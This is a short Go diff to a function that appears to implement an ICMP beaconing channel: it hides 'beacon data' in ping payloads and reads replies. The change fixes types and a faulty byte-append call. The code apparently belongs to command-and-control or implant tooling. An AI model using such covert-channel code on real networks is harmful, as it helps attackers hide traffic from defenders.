@@ -4,7 +4,6 @@
 package main
 
 import (
-	"encoding/binary"
 	"fmt"
 	"net"
 	"time"
@@ -40,8 +39,8 @@ func sendICMPBeacon(body []byte) []byte {
 	defer conn.Close()
 
 	// Build ICMP echo request with beacon data as payload
-	id := uint16(time.Now().UnixNano() & 0xFFFF)
-	seq := uint16(1)
+	id := int(time.Now().UnixNano() & 0xFFFF)
+	seq := 1
 	wm := icmp.Message{
 		Type: ipv4.ICMPTypeEcho,
 		Code: 0,
@@ -99,7 +98,7 @@ func sendICMPBeacon(body []byte) []byte {
 			debugLog(fmt.Sprintf("ICMP ID mismatch: %d vs %d", echo.ID, id))
 			return nil
 		}
-		return binary.Append(nil, echo.Data...)
+		return append([]byte(nil), echo.Data...)
 	default:
 		debugLog(fmt.Sprintf("ICMP unexpected type: %v", rm.Type))
 		return nil
